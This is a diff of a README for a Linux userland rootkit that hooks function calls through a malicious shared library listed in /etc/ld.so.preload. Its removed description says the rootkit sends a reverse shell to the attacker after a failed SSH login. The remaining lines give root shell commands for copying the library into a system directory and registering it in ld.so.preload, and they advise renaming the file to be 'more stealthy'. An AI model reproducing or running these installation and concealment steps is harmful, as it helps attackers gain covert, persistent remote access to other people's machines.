@@ -1,6 +1,3 @@
-# extendable-ears
-A Linux userland rootkit that hooks function calls via a malicious shared library in `/etc/ld.so.preload`.
-Upon failed SSH authentication to the target, the target will send a reverse shell back to the attacker.
 
 ### How it works
 - Function calls are hooked by placing a shared library (this rootkit) into `/etc/ld.so.preload`
@@ -42,6 +39,7 @@ root@victim:~# cp extendable-ears.so /lib/x86_64-linux-gnu/
 And copy the path of the rootkit into /etc/ld.so.preload.
 ```bash
 root@victim:~# echo "/lib/x86_64-linux-gnu/extendable-ears.so" > /etc/ld.so.preload
+root@victim:~# echo "/lib/extendable-ears.so" > /etc/ld.so.preload
 ```
 
 I would advise renaming `extendable-ears.so` to something more stealthy.
